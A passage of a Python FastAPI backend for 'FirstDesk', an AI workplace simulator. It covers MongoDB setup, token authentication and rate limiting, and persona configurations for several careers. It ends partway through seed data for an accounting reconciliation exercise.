"""
FirstDesk MVP — Your First Job, Before Your First Job
Multi-career AI workplace simulator with inter-agent communication.

Architecture:
  Router Agent → selects career → seeds MongoDB → loads orchestrator
  Orchestrator Agent → 4 agent personas → 14+ tools → MongoDB state
  Inter-agent comms → agents email EACH OTHER, user sees CC'd messages
  System events → IT outages, tool downtime, random disruptions

Careers: Accountant | Cybersecurity | Marketing | Developer
Agents: Manager | Client | Teammate | IT Support (+ HR as system)
"""
import os, json, uuid, hashlib, hmac, base64, secrets, time, re
import logging
import contextvars
import asyncio
from collections import defaultdict, deque
from datetime import datetime, timedelta
from contextlib import asynccontextmanager
from typing import Annotated, Any, Optional
from fastapi import BackgroundTasks, FastAPI, Header, HTTPException, Request, WebSocket, WebSocketDisconnect
from fastapi.exceptions import RequestValidationError
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, BeforeValidator, Field, field_validator
from pymongo import MongoClient
from pymongo.errors import PyMongoError

# ── STRUCTURED LOGGING ────────────────────────────────────────────
# One log line per event with a request-id correlation token, so a single
# user request can be traced across middleware, orchestrator, background tasks.
_LOG_LEVEL = os.environ.get("LOG_LEVEL", "INFO").upper()
_request_id_var: "contextvars.ContextVar[str]" = contextvars.ContextVar("request_id", default="-")

class _RequestIdFilter(logging.Filter):
    def filter(self, record: logging.LogRecord) -> bool:
        record.request_id = _request_id_var.get()
        return True

_handler = logging.StreamHandler()
_handler.setFormatter(logging.Formatter(
    "%(asctime)s %(levelname)s [%(request_id)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%S",
))
_handler.addFilter(_RequestIdFilter())
logging.basicConfig(level=_LOG_LEVEL, handlers=[_handler], force=True)
log = logging.getLogger("firstdesk")
from langchain_fireworks import ChatFireworks
from langchain.tools import tool
from langgraph.prebuilt import create_react_agent
from langgraph.graph import StateGraph, START, END
from langgraph.graph.message import add_messages
from typing_extensions import TypedDict

from scenario_engine import (
    MaterializerCollections,
    Materializer,
    ScenarioEngine,
    ScenarioExtractor,
    SeedFileSource,
    AdzunaSource,
    build_default_engine,
)
from tool_dispatch import (
    SUPPORTED_TYPES as TOOL_SUPPORTED_TYPES,
    DEFAULT_ICON as TOOL_DEFAULT_ICON,
    DEFAULT_TINT as TOOL_DEFAULT_TINT,
    dispatch_action as tool_dispatch_action,
    normalise_tool_spec,
)
from workplace_physics import WorkplacePhysicsEngine, WORKPLACE_PHYSICS

MONGO_URI = os.environ.get("MONGO_URI", "mongodb://localhost:27017")
FIREWORKS_KEY = os.environ.get("FIREWORKS_API_KEY", "")

# Startup env-var validation. STRICT_ENV=1 fails fast in production.
_REQUIRED_ENV = ("MONGO_URI", "FIREWORKS_API_KEY")
_missing_env = [v for v in _REQUIRED_ENV if not os.environ.get(v)]
if _missing_env:
    msg = f"Missing required environment variable(s): {', '.join(_missing_env)}"
    if os.environ.get("STRICT_ENV") == "1":
        raise RuntimeError(msg)
    log.warning("startup.env_missing %s", _missing_env)

# Mongo: bounded pool + bounded server-selection so a dead cluster fails fast.
mongo = MongoClient(MONGO_URI, maxPoolSize=50, serverSelectionTimeoutMS=5000, retryWrites=True)
db = mongo["firstdesk"]

# Collections
emails_col = db["emails"]
tasks_col = db["tasks"]
sheets_col = db["spreadsheets"]
invoices_col = db["invoices"]
evals_col = db["evaluations"]
memory_col = db["agent_memory"]
actions_col = db["user_actions"]
sessions_col = db["sessions"]
agent_comms_col = db["agent_comms"]
system_events_col = db["system_events"]
careers_col = db["careers"]
siem_col = db["siem_alerts"]
jira_col = db["jira_tickets"]
campaigns_col = db["campaigns"]
reputation_col = db["reputation"]
users_col = db["users"]
progress_col = db["progress"]

# Adaptive Scenario Engine — JD ingestion, scenario templates, per-user uniqueness ledger.
jobs_col = db["jobs"]
scenarios_col = db["scenarios"]
user_scenarios_col = db["user_scenarios"]
# Slack is a real shared tool now — multi-tool tasks broadcast progress here.
slack_col = db["slack_messages"]
# Generic tool surfaces (table / sql / kanban / dashboard / alerts / editor /
# terminal / crm). Scenario-driven; the desktop renders them dynamically.
tools_col = db["tools"]
# Interview Practice — standalone or post-simulation. One doc per attempt.
interviews_col = db["interviews"]
# Analytics — append-only event log (user_registered, simulation_started, etc.).
analytics_col = db["analytics"]

# Indexes + demo seed created lazily on first request to avoid hard-failing module import when Mongo is down.
_bootstrap_done = False
DEMO_EMAIL = os.environ.get("DEMO_EMAIL", "demo@firstdesk.app")
DEMO_PASSWORD = os.environ.get("DEMO_PASSWORD") or secrets.token_urlsafe(24)
# In production set DEMO_PASSWORD via env, or leave unset → a random non-loggable password is used.
def _ensure_bootstrap():
    global _bootstrap_done
    if _bootstrap_done: return
    try:
        users_col.create_index("email", unique=True)
        progress_col.create_index("user_id", unique=True)
        # Query-path indexes. All sim-scoped collections are filtered by simulation_id.
        for _c in (emails_col, tasks_col, evals_col, siem_col, jira_col,
                   campaigns_col, invoices_col, slack_col, tools_col,
                   reputation_col, agent_comms_col, system_events_col,
                   sheets_col, interviews_col, user_scenarios_col):
            try: _c.create_index("simulation_id")
            except Exception: pass
        try:
            sessions_col.create_index("session_id", unique=True)
            sessions_col.create_index("user_id")
            memory_col.create_index("session_id")
            actions_col.create_index([("simulation_id", 1), ("ts", -1)])
            analytics_col.create_index([("ts", -1)])
            analytics_col.create_index("event")
        except Exception:
            pass
        if not users_col.find_one({"email": DEMO_EMAIL}):
            uid = "u_demo000000000"
            users_col.insert_one({
                "user_id": uid,
                "email": DEMO_EMAIL,
                "name": "Demo User",
                "password_hash": _hash_pw(DEMO_PASSWORD),
                "created_at": datetime.utcnow().isoformat(),
                "is_demo": True,
            })
            progress_col.insert_one({
                "user_id": uid, "current_career": None, "current_day": 0,
                "days_completed": 0, "cumulative_score": 0,
                "started_at": datetime.utcnow().isoformat(),
            })
            log.info("bootstrap.seed_demo_user email=%s", DEMO_EMAIL)
        _bootstrap_done = True
    except Exception as e:
        log.exception("bootstrap.failed kind=%s msg=%s", type(e).__name__, e)
        raise HTTPException(503, f"Database unavailable. Is MongoDB running? ({type(e).__name__})")

# ── PER-REQUEST SCOPE (multi-tenant safe) ─────────────────────────
# Every concurrent request gets its own sim_id() / session_id() / career via
# contextvars. The auth middleware sets them at the start of each request.
# Tools and endpoints read them through the helper functions below.
_user_id_var: contextvars.ContextVar[Optional[str]] = contextvars.ContextVar("user_id", default=None)
_sim_id_var: contextvars.ContextVar[str] = contextvars.ContextVar("sim_id", default="sim_anon")
_session_id_var: contextvars.ContextVar[str] = contextvars.ContextVar("session_id", default="sess_anon")
_career_var: contextvars.ContextVar[Optional[str]] = contextvars.ContextVar("career", default=None)

def sim_id() -> str: return _sim_id_var.get()
def session_id() -> str: return _session_id_var.get()
def get_career() -> Optional[str]: return _career_var.get()
def user_id() -> Optional[str]: return _user_id_var.get()

def set_scope(user_id_val: str, career: Optional[str] = ...) -> None:
    """Set per-request scope. Called by auth middleware once per request."""
    _user_id_var.set(user_id_val)
    _sim_id_var.set(f"sim_{user_id_val}")
    _session_id_var.set(f"sess_{user_id_val}")
    if career is not ...:
        _career_var.set(career)

# ── PER-USER CACHES ──────────────────────────────────────────────
# Process-local; fine for the single-process alpha. For horizontal scaling
# move these to Redis. Each user gets their own orchestrator (heavy LangChain
# object) and chat history. An asyncio lock guards creation so a flurry of
# concurrent first-requests from the same user doesn't double-instantiate.
_USER_CACHE_LIMIT = 200  # bounded; LRU-evict beyond this
_user_orchestrators: "dict[str, Any]" = {}
_user_chat_history: "dict[str, list]" = {}
_user_locks: "dict[str, asyncio.Lock]" = {}
_orchestrator_lock = asyncio.Lock()

def _evict_if_full(d: dict, limit: int = _USER_CACHE_LIMIT) -> None:
    if len(d) > limit:
        # Drop oldest insertion-order entry (Python 3.7+ dicts preserve order).
        try:
            oldest = next(iter(d))
            d.pop(oldest, None)
            log.info("cache.evict key=%s remaining=%d", oldest, len(d))
        except StopIteration:
            pass

def get_orchestrator():
    uid = _user_id_var.get()
    return _user_orchestrators.get(uid) if uid else None

def set_orchestrator(orc) -> None:
    uid = _user_id_var.get()
    if uid is None: return
    if orc is None:
        _user_orchestrators.pop(uid, None)
    else:
        _user_orchestrators[uid] = orc
        _evict_if_full(_user_orchestrators)

def get_chat_history() -> list:
    uid = _user_id_var.get() or "_anon"
    h = _user_chat_history.setdefault(uid, [])
    _evict_if_full(_user_chat_history)
    return h

def reset_chat_history() -> None:
    uid = _user_id_var.get() or "_anon"
    _user_chat_history[uid] = []

def _current_day() -> int:
    """Current day cursor for the active session. Drives day-progression
    filtering on alert/ticket/etc. queries so users only see content up to
    the day they've reached."""
    s = sessions_col.find_one({"session_id": session_id()}, {"_id": 0, "current_day": 1}) or {}
    return int(s.get("current_day") or 1)

def _tag_day1_artifacts() -> None:
    """After seeding, stamp every freshly-inserted artefact (which has no day
    field yet) as day:1 so the day-filtered endpoints surface it from Day 1."""
    _sim = sim_id()
    for col in (emails_col, tasks_col, invoices_col, jira_col, campaigns_col, siem_col):
        try:
            col.update_many(
                {"simulation_id": _sim, "day": {"$exists": False}},
                {"$set": {"day": 1}},
            )
        except Exception:
            pass

# ── EXPERIENCE-LEVEL SCORING WEIGHTS ─────────────────────────────
# Same simulation, same difficulty for everyone. Only the score WEIGHT
# changes based on user's stated experience level:
#   experienced → standard scoring
#   studied     → +10% on positive points (rewards proving competence)
#   beginner    → first mistake per tool-kind costs 0pts (learning curve);
#                 subsequent mistakes use the full penalty.
def _apply_level_weight(pts: int, action_kind: str) -> int:
    """Adjust raw points based on the session's experience_level.
    action_kind is a short tag like 'siem' / 'sage_disc' / 'task' that
    identifies the tool family for the beginner first-mistake forgiveness."""
    sess = sessions_col.find_one({"session_id": session_id()}, {"_id": 0, "experience_level": 1, "beginner_first_mistakes": 1}) or {}
    level = sess.get("experience_level", "experienced")
    if level == "studied" and pts > 0:
        return int(round(pts * 1.10))
    if level == "beginner" and pts < 0:
        forgiven = sess.get("beginner_first_mistakes") or []
        if action_kind not in forgiven:
            sessions_col.update_one(
                {"session_id": session_id()},
                {"$addToSet": {"beginner_first_mistakes": action_kind}},
            )
            return 0  # first mistake on this tool family is free
    return pts

# ── PER-IP RATE LIMIT ────────────────────────────────────────────
# Sliding-window. Bounded memory: stale entries are evicted after 5 minutes
# of inactivity by the periodic cleanup task started at app boot.
_chat_rate: "dict[str, deque]" = defaultdict(lambda: deque(maxlen=32))
_RATE_WINDOW_SEC = 60
_RATE_LIMIT = 20  # messages per minute per IP
_RATE_STALE_SEC = 300  # drop an IP's rate entry after 5 minutes idle

def _client_ip(request: Request) -> str:
    """Best-effort client IP. Honours common proxy headers when present."""
    fwd = request.headers.get("x-forwarded-for")
    if fwd:
        return fwd.split(",")[0].strip()
    real = request.headers.get("x-real-ip")
    if real:
        return real.strip()
    return request.client.host if request.client else "unknown"

def _check_rate_limit(key: str) -> bool:
    now = time.time()
    q = _chat_rate[key]
    while q and now - q[0] > _RATE_WINDOW_SEC:
        q.popleft()
    if len(q) >= _RATE_LIMIT:
        return False
    q.append(now)
    return True

async def _rate_limit_janitor() -> None:
    """Periodic cleanup so the rate-limit dict can't grow unbounded."""
    while True:
        try:
            await asyncio.sleep(_RATE_STALE_SEC)
            now = time.time()
            stale = [k for k, q in _chat_rate.items() if not q or now - q[-1] > _RATE_STALE_SEC]
            for k in stale:
                _chat_rate.pop(k, None)
            if stale:
                log.debug("rate_limit.cleanup removed=%d remaining=%d", len(stale), len(_chat_rate))
        except asyncio.CancelledError:
            break
        except Exception as ex:
            log.exception("rate_limit.janitor_err kind=%s", type(ex).__name__)


# ── AUTH ───────────────────────────────────────────────
AUTH_SECRET = os.environ.get("AUTH_SECRET")
if not AUTH_SECRET:
    raise RuntimeError(
        "AUTH_SECRET env var is required. Generate one with: "
        "python3 -c \"import secrets; print(secrets.token_hex(32))\" "
        "and set it in .env. Without a stable secret, all user tokens are invalidated on every restart."
    )
TOKEN_TTL = 60 * 60 * 24 * 7  # 7 days
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")

def _hash_pw(pw: str, salt: bytes = None) -> str:
    salt = salt or secrets.token_bytes(16)
    h = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), salt, 200_000)
    return base64.b64encode(salt).decode() + "$" + base64.b64encode(h).decode()

def _verify_pw(pw: str, stored: str) -> bool:
    try:
        salt_b64, h_b64 = stored.split("$", 1)
        salt = base64.b64decode(salt_b64)
        expected = base64.b64decode(h_b64)
        actual = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), salt, 200_000)
        return hmac.compare_digest(expected, actual)
    except Exception:
        return False

def _make_token(user_id: str) -> str:
    payload = f"{user_id}.{int(time.time()) + TOKEN_TTL}"
    sig = hmac.new(AUTH_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
    return base64.urlsafe_b64encode(f"{payload}.{sig}".encode()).decode().rstrip("=")

def _verify_token(token: str) -> Optional[str]:
    try:
        raw = base64.urlsafe_b64decode(token + "=" * (-len(token) % 4)).decode()
        user_id, expiry, sig = raw.rsplit(".", 2)
        payload = f"{user_id}.{expiry}"
        expected = hmac.new(AUTH_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(sig, expected): return None
        if int(expiry) < int(time.time()): return None
        return user_id
    except Exception:
        return None

def _user_from_auth(authorization: Optional[str]) -> Optional[dict]:
    if not authorization or not authorization.lower().startswith("bearer "):
        return None
    uid = _verify_token(authorization.split(" ", 1)[1].strip())
    if not uid: return None
    return users_col.find_one({"user_id": uid}, {"_id": 0, "password_hash": 0})

_PAID_PLANS = {"pro", "premium", "team", "enterprise"}

def _public_user(u: dict) -> dict:
    return {"user_id": u["user_id"], "email": u["email"], "name": u.get("name", ""),
            "is_guest": bool(u.get("is_guest", False)),
            "plan": (u.get("plan") or "free")}

def _user_is_paid(u: Optional[dict]) -> bool:
    return bool(u and (u.get("plan") or "free") in _PAID_PLANS)

def _require_paid(u: Optional[dict]):
    if not u:
        raise HTTPException(401, "Unauthorized")
    if not _user_is_paid(u):
        raise HTTPException(
            status_code=402,
            detail={"error": "upgrade_required",
                    "message": "Interview features are available on the Pro plan.",
                    "feature": "interview"},
        )

def _clean_tool_json(text: str) -> str:
    """If the model emitted a tool-call JSON envelope as text, extract just the human message body."""
    if not text:
        return text
    s = text.strip()
    # Some models prefix or suffix the JSON with stray characters — find the first { and last }.
    if not (s.startswith("{") or s.startswith('"type"')):
        return text
    start, end = s.find("{"), s.rfind("}")
    if start < 0 or end < 0:
        return text
    try:
        obj = json.loads(s[start:end+1])
    except Exception:
        return text
    if not isinstance(obj, dict) or "parameters" not in obj:
        return text
    p = obj.get("parameters") or {}
    # Common field names models use for the message body
    for k in ("email", "body", "message", "text", "content"):
        v = p.get(k)
        if isinstance(v, str) and v.strip():
            return v.strip()
    return text

# ══════════════════════════════════════════
# CAREER CONFIGS
# ══════════════════════════════════════════

CAREER_CONFIGS = {
    "accountant": {
        "title": "Junior Accountant",
        "company": "Apex Financial Ltd",
        "department": "Finance",
        "manager": {"name": "Sarah Mitchell", "role": "Finance Manager", "email": "s.mitchell@apexfinancial.com"},
        "client": {"name": "James Crawford", "role": "Crawford & Sons Ltd", "email": "j.crawford@crawfordsons.co.uk"},
        "teammate": {"name": "David Chen", "role": "Senior Accountant", "email": "d.chen@apexfinancial.com"},
        "it": {"name": "Tom Baker", "role": "IT Support", "email": "t.baker@apexfinancial.com"},
        "hr": {"name": "Rachel Owens", "role": "HR Business Partner", "email": "r.owens@apexfinancial.com"},
        "director": {"name": "Margaret Holloway", "role": "Finance Director", "email": "m.holloway@apexfinancial.com"},
        "tools": ["outlook", "sage", "tasks", "slack", "sheets"],
    },
    "cybersecurity": {
        "title": "Junior Cybersecurity Analyst",
        "company": "ShieldWall Security",
        "department": "Security Operations",
        "manager": {"name": "Alex Rivera", "role": "SOC Manager", "email": "a.rivera@shieldwall.io"},
        "client": {"name": "DataFlow Inc", "role": "Client (Breach Report)", "email": "cto@dataflow.io"},
        "teammate": {"name": "Priya Sharma", "role": "Senior Analyst", "email": "p.sharma@shieldwall.io"},
        "it": {"name": "Tom Okafor", "role": "IT Infrastructure", "email": "t.okafor@shieldwall.io"},
        "hr": {"name": "Diane Whitford", "role": "HR Business Partner", "email": "d.whitford@shieldwall.io"},
        "director": {"name": "Marcus Vale", "role": "VP Security", "email": "m.vale@shieldwall.io"},
        "tools": ["outlook", "siem", "tasks", "slack", "jira"],
    },
    "marketing": {
        "title": "Junior Marketing Coordinator",
        "company": "BrightPath Agency",
        "department": "Marketing",
        "manager": {"name": "Lisa Chen", "role": "Marketing Director", "email": "l.chen@brightpath.co"},
        "client": {"name": "NovaTech", "role": "Brand Partner", "email": "marketing@novatech.com"},
        "teammate": {"name": "Sam Williams", "role": "Senior Designer", "email": "s.williams@brightpath.co"},
        "it": {"name": "Tom Reeves", "role": "IT Support", "email": "t.reeves@brightpath.co"},
        "hr": {"name": "Yasmin Khalil", "role": "People & Culture Lead", "email": "y.khalil@brightpath.co"},
        "director": {"name": "Jonathan Pierce", "role": "Managing Director", "email": "j.pierce@brightpath.co"},
        "tools": ["outlook", "campaigns", "tasks", "slack", "analytics"],
    },
    "developer": {
        "title": "Junior Software Developer",
        "company": "CodeCraft Labs",
        "department": "Engineering",
        "manager": {"name": "Mike Torres", "role": "Tech Lead", "email": "m.torres@codecraft.dev"},
        "client": {"name": "Product Team", "role": "Product Manager", "email": "pm@codecraft.dev"},
        "teammate": {"name": "Aisha Patel", "role": "QA Engineer", "email": "a.patel@codecraft.dev"},
        "it": {"name": "Tom Zhang", "role": "DevOps", "email": "t.zhang@codecraft.dev"},
        "hr": {"name": "Nadia Brooks", "role": "People Operations", "email": "n.brooks@codecraft.dev"},
        "director": {"name": "Hiroshi Tanaka", "role": "VP Engineering", "email": "h.tanaka@codecraft.dev"},
        "tools": ["outlook", "jira", "tasks", "slack", "ci"],
    },
    "procurement": {
        "title": "Junior IT Procurement Specialist",
        "company": "TechStack Procurement Ltd",
        "department": "IT Procurement",
        "manager": {"name": "Helena Voss", "role": "Head of IT Procurement", "email": "h.voss@techstack.co"},
        "client": {"name": "Engineering Org", "role": "Internal Requester", "email": "engops@techstack.co"},
        "teammate": {"name": "Olu Adesina", "role": "Senior Procurement Analyst", "email": "o.adesina@techstack.co"},
        "it": {"name": "Tom Brennan", "role": "IT Service Manager", "email": "t.brennan@techstack.co"},
        "hr": {"name": "Iris Calloway", "role": "People Partner", "email": "i.calloway@techstack.co"},
        "director": {"name": "Daniel Okafor", "role": "CFO", "email": "d.okafor@techstack.co"},
        "tools": ["outlook", "po_system", "tasks", "slack", "vendors"],
    },
    "hr": {
        "title": "Junior Learning & Development Specialist",
        "company": "Helix People Co.",
        "department": "People — Learning & Development",
        "manager": {"name": "Lena Park", "role": "Head of Learning & Development", "email": "l.park@helixpeople.co"},
        "client": {"name": "All Employees", "role": "Internal Learners", "email": "learners@helixpeople.co"},
        "teammate": {"name": "Marcus Ojo", "role": "Senior L&D Partner", "email": "m.ojo@helixpeople.co"},
        "it": {"name": "Devon Reilly", "role": "IT Service Manager", "email": "d.reilly@helixpeople.co"},
        "hr": {"name": "Priya Anand", "role": "People Operations Lead", "email": "p.anand@helixpeople.co"},
        "director": {"name": "Sofia Reyes", "role": "Chief People Officer", "email": "s.reyes@helixpeople.co"},
        "tools": ["outlook", "lms", "tasks", "slack", "pipeline"],
    },
    "pm": {
        "title": "Junior Growth Product Manager",
        "company": "Northwind Cloud",
        "department": "Product — Growth",
        "manager": {"name": "Rohan Patel", "role": "Director of Growth", "email": "r.patel@northwind.cloud"},
        "client": {"name": "Sales & PMM", "role": "Internal Stakeholders", "email": "gtm@northwind.cloud"},
        "teammate": {"name": "Anya Ostrovsky", "role": "Senior Growth PM", "email": "a.ostrovsky@northwind.cloud"},
        "it": {"name": "Jordan Park", "role": "IT Service Manager", "email": "j.park@northwind.cloud"},
        "hr": {"name": "Lara Schmidt", "role": "People Partner", "email": "l.schmidt@northwind.cloud"},
        "director": {"name": "Marcus Reeve", "role": "CEO", "email": "m.reeve@northwind.cloud"},
        "tools": ["outlook", "roadmap", "tasks", "slack", "requests"],
    },
}

# ══════════════════════════════════════════
# SEED FUNCTIONS
# ══════════════════════════════════════════

def clear_sim():
    for c in [emails_col, tasks_col, sheets_col, invoices_col, evals_col, memory_col, actions_col, agent_comms_col, system_events_col, siem_col, jira_col, campaigns_col, slack_col, tools_col]:
        c.delete_many({"simulation_id": sim_id()})
    reputation_col.delete_many({"simulation_id": sim_id()})

def _seed_accountant_artifacts(cfg):
    """Career-specific Sage data (spreadsheets, invoices, system events).
    Called from `seed_accountant` (full fallback path) AND from `/api/start`
    after the scenario engine succeeds, since the engine only materialises
    emails/tasks/slack/tools — it doesn't know about our rich Sage schema.
    Idempotent per simulation_id."""
    coa = {
        "1001":"Bank Current Account","1002":"Bank Reserve Account",
        "1100":"Trade Receivables","1200":"VAT Recoverable",
        "1300":"Office Equipment","1400":"Petty Cash",
        "2100":"Wages Payable","2200":"HMRC — VAT Payable",
        "2300":"Trade Payables","2400":"Long-term Loan",
        "3000":"Share Capital","3500":"Retained Earnings",
        "4000":"Sales — Services","4100":"Sales — Goods","4200":"Other Income",
        "5001":"Office Supplies","5005":"Office Rent","5006":"Travel & Conferences",
        "5010":"Software & IT","5015":"Professional Fees & Insurance",
        "5020":"Logistics & Couriers","5025":"Bank Charges & Interest",
        "5030":"Utilities","9999":"Suspense",
    }
    bank=[
        {"date":"2026-03-01","desc":"Opening Balance","dr":0,"cr":0,"bal":45230.00},
        {"date":"2026-03-01","desc":"Nexus Corp — INV-4801","dr":0,"cr":8500,"bal":53730.00},
        {"date":"2026-03-02","desc":"Staples — PO-2831","dr":342.50,"cr":0,"bal":53387.50},
        {"date":"2026-03-03","desc":"Office Supplies Ltd — PO-2832","dr":218.40,"cr":0,"bal":53169.10},
        {"date":"2026-03-04","desc":"Crawford & Sons — INV-4821","dr":0,"cr":11800,"bal":64969.10},
        {"date":"2026-03-05","desc":"Payroll — March","dr":28400,"cr":0,"bal":36569.10},
        {"date":"2026-03-06","desc":"Thames Water — UTL-0312","dr":284.10,"cr":0,"bal":36285.00},
        {"date":"2026-03-07","desc":"Meridian Ltd — INV-4807","dr":0,"cr":4200,"bal":40485.00},
        {"date":"2026-03-08","desc":"Stripe processing fees","dr":127.50,"cr":0,"bal":40357.50},
        {"date":"2026-03-09","desc":"Hiscox Insurance — INS-0309","dr":892,"cr":0,"bal":39465.50},
        {"date":"2026-03-10","desc":"HMRC VAT — Q4 return","dr":6700,"cr":0,"bal":32765.50},
        {"date":"2026-03-11","desc":"TechFlow — INV-4812","dr":0,"cr":15000,"bal":47765.50},
        {"date":"2026-03-12","desc":"Office rent — March","dr":4500,"cr":0,"bal":43265.50},
        {"date":"2026-03-13","desc":"AWS subscription","dr":1210,"cr":0,"bal":42055.50},
        {"date":"2026-03-14","desc":"Orion Group — INV-4815","dr":0,"cr":7300,"bal":49355.50},
        {"date":"2026-03-15","desc":"Premier Couriers — LOG-0315","dr":612,"cr":0,"bal":48743.50},
        {"date":"2026-03-16","desc":"Petty cash withdrawal","dr":150,"cr":0,"bal":48593.50},
        {"date":"2026-03-17","desc":"BlueStar — INV-4818","dr":0,"cr":3400,"bal":51993.50},
        {"date":"2026-03-18","desc":"HSBC interest credit","dr":0,"cr":84.20,"bal":52077.70},
        {"date":"2026-03-19","desc":"DataVault — INV-4820","dr":0,"cr":9800,"bal":61877.70},
        {"date":"2026-03-20","desc":"Pinewood Supplies — SUP-3091","dr":4820,"cr":0,"bal":57057.70},
        {"date":"2026-03-21","desc":"Conference ACCA","dr":1850,"cr":0,"bal":55207.70},
        {"date":"2026-03-22","desc":"Sterling Inc — INV-4822","dr":0,"cr":6100,"bal":61307.70},
        {"date":"2026-03-23","desc":"CloudHost Ltd — SUP-3092","dr":1295,"cr":0,"bal":60012.70},
        {"date":"2026-03-24","desc":"Apex Holdings — INV-4824","dr":0,"cr":12500,"bal":72512.70},
        {"date":"2026-03-25","desc":"Bank charges","dr":45,"cr":0,"bal":72467.70},
        {"date":"2026-03-26","desc":"Mortgage interest — LOAN","dr":2400,"cr":0,"bal":70067.70},
        {"date":"2026-03-27","desc":"Quantum Labs — INV-4826","dr":0,"cr":5500,"bal":75567.70},
        {"date":"2026-03-28","desc":"Vodafone — TEL-0328","dr":218,"cr":0,"bal":75349.70},
        {"date":"2026-03-29","desc":"Director's expense — EXP-0346","dr":456,"cr":0,"bal":74893.70},
        {"date":"2026-03-30","desc":"ZenithGroup — INV-4830","dr":0,"cr":9200,"bal":84093.70},
        {"date":"2026-03-31","desc":"Closing Balance","dr":0,"cr":0,"bal":84093.70},
    ]
    ledger=[
        {"date":"2026-03-01","acc":"1001","desc":"Opening Balance","dr":0,"cr":0,"ref":"OB"},
        {"date":"2026-03-01","acc":"1100","desc":"Nexus Corp","dr":0,"cr":8500,"ref":"INV-4801"},
        {"date":"2026-03-02","acc":"5001","desc":"Staples","dr":342.50,"cr":0,"ref":"PO-2831"},
        {"date":"2026-03-03","acc":"5001","desc":"Office Supplies Ltd","dr":218.40,"cr":0,"ref":"PO-2832"},
        {"date":"2026-03-04","acc":"1100","desc":"Crawford & Sons","dr":0,"cr":11800,"ref":"INV-4821"},
        {"date":"2026-03-05","acc":"2100","desc":"Payroll","dr":28400,"cr":0,"ref":"PAY-MAR"},
        {"date":"2026-03-06","acc":"5030","desc":"Thames Water","dr":284.10,"cr":0,"ref":"UTL-0312"},
        {"date":"2026-03-07","acc":"1100","desc":"Meridian Ltd","dr":0,"cr":4200,"ref":"INV-4807"},
        {"date":"2026-03-08","acc":"5025","desc":"Stripe processing fees","dr":127.50,"cr":0,"ref":"BCH-0301"},
        {"date":"2026-03-09","acc":"5015","desc":"Hiscox Insurance","dr":892,"cr":0,"ref":"INS-0309"},
        {"date":"2026-03-10","acc":"2200","desc":"HMRC VAT — Q4","dr":6700,"cr":0,"ref":"VAT-Q4"},
        {"date":"2026-03-11","acc":"1100","desc":"TechFlow","dr":0,"cr":15000,"ref":"INV-4812"},
        {"date":"2026-03-12","acc":"5005","desc":"Office rent","dr":4500,"cr":0,"ref":"RENT-MAR"},
        {"date":"2026-03-13","acc":"5010","desc":"AWS subscription","dr":1210,"cr":0,"ref":"CLOUD-0313"},
        {"date":"2026-03-14","acc":"1100","desc":"Orion Group","dr":0,"cr":7300,"ref":"INV-4815"},
        {"date":"2026-03-15","acc":"5020","desc":"Premier Couriers","dr":612,"cr":0,"ref":"LOG-0315"},
        {"date":"2026-03-17","acc":"1100","desc":"BlueStar","dr":0,"cr":3400,"ref":"INV-4818"},
        {"date":"2026-03-18","acc":"4200","desc":"HSBC interest credit","dr":0,"cr":84.20,"ref":"INT-0318"},
        {"date":"2026-03-19","acc":"1100","desc":"DataVault","dr":0,"cr":9800,"ref":"INV-4820"},
        {"date":"2026-03-20","acc":"5001","desc":"Pinewood Supplies","dr":4820,"cr":0,"ref":"SUP-3091"},
        {"date":"2026-03-21","acc":"5006","desc":"Conference ACCA","dr":1580,"cr":0,"ref":"EXP-0345"},
        {"date":"2026-03-22","acc":"1100","desc":"Sterling Inc","dr":0,"cr":6100,"ref":"INV-4822"},
        {"date":"2026-03-23","acc":"5010","desc":"CloudHost Ltd","dr":1295,"cr":0,"ref":"SUP-3092"},
        {"date":"2026-03-24","acc":"1100","desc":"Apex Holdings","dr":0,"cr":12500,"ref":"INV-4824"},
        {"date":"2026-03-24","acc":"1100","desc":"Apex Holdings","dr":0,"cr":12500,"ref":"INV-4824-DUP"},
        {"date":"2026-03-26","acc":"5025","desc":"Mortgage interest","dr":2400,"cr":0,"ref":"LOAN-0326"},
        {"date":"2026-03-27","acc":"1100","desc":"Quantum Labs","dr":0,"cr":5500,"ref":"INV-4826"},
        {"date":"2026-03-28","acc":"5010","desc":"Vodafone","dr":218,"cr":0,"ref":"TEL-0328"},
        {"date":"2026-03-29","acc":"5006","desc":"Director's expense","dr":456,"cr":0,"ref":"EXP-0346"},
        {"date":"2026-03-30","acc":"1100","desc":"ZenithGroup","dr":0,"cr":9200,"ref":"INV-4830"},
    ]
    discrepancies=[
        {"id":"d1","type":"missing_from_ledger","date":"2026-03-16","description":"Petty cash withdrawal","amount":150,"difficulty":"medium"},
        {"id":"d2","type":"amount_mismatch","date":"2026-03-21","description":"Conference ACCA","bank_amount":1850,"ledger_amount":1580,"difficulty":"easy"},
        {"id":"d3","type":"missing_from_ledger","date":"2026-03-25","description":"Bank charges","amount":45,"difficulty":"hard"},
        {"id":"d4","type":"duplicate_in_ledger","date":"2026-03-24","description":"Apex Holdings posted twice (INV-4824 + INV-4824-DUP)","amount":12500,"difficulty":"medium"},
    ]
    trial_balance=[
        {"acc":"1100","name":"Trade Receivables","dr":0,"cr":105800.00,"bal":-105800.00},
        {"acc":"2100","name":"Wages Payable","dr":28400.00,"cr":0,"bal":28400.00},
        {"acc":"2200","name":"HMRC VAT Payable","dr":6700.00,"cr":0,"bal":6700.00},
        {"acc":"4200","name":"Other Income","dr":0,"cr":84.20,"bal":-84.20},
        {"acc":"5001","name":"Office Supplies","dr":5380.90,"cr":0,"bal":5380.90},
        {"acc":"5005","name":"Office Rent","dr":4500.00,"cr":0,"bal":4500.00},
        {"acc":"5006","name":"Travel & Conferences","dr":2036.00,"cr":0,"bal":2036.00},
        {"acc":"5010","name":"Software & IT","dr":2723.00,"cr":0,"bal":2723.00},
        {"acc":"5015","name":"Professional Fees & Insurance","dr":892.00,"cr":0,"bal":892.00},
        {"acc":"5020","name":"Logistics & Couriers","dr":612.00,"cr":0,"bal":612.00},
